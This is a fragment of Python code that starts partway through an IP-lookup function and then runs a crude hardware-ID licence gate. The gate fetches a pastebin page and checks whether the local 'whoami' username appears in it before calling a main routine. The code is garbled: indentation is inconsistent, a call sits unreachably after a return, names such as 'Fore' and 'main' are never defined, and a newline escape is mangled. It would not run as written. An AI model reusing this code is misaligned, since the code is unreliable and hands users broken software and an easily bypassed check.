                response = urlopen(url)
                data = json.load(response)
                ip = data['ip']
            except: pass 
            return ip 
            ip = getip()
import subprocess
import requests
import time
import sys
import os
from httpx import Client
sess = Client(timeout=120,headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.59",})
r = sess.get("https://pastebin.com/V19GDqkL")
from subprocess import check_output
hwid = check_output("whoami").splitlines()[0].decode()
def ch():    
            os.system('cls' if os.name == 'nt' else 'clear')    
if hwid in r.text:        
            os.system('cls' if os.name == 'nt' else 'clear')        
            print(f"{Fore.GREEN}SUCCESS! | SAVE HWID!n")        
            os.system('cls' if os.name == 'nt' else 'clear')        
            time.sleep(2)        
            main()    
else:       
                os.system('cls' if os.name == 'nt' else 'clear')       
                print(f"{Fore.RED}[!] HWID NOT FOUND{Fore.RESET}")        
                os.system('cls' if os.name == 'nt' else 'clear')        
                print()        
                print()       
                print(f"Your Key : {hwid}")        
                print()        
                print('[!] Enter To Exit')    
                sys.exit()
if __name__ == "__main__":    
    ch()
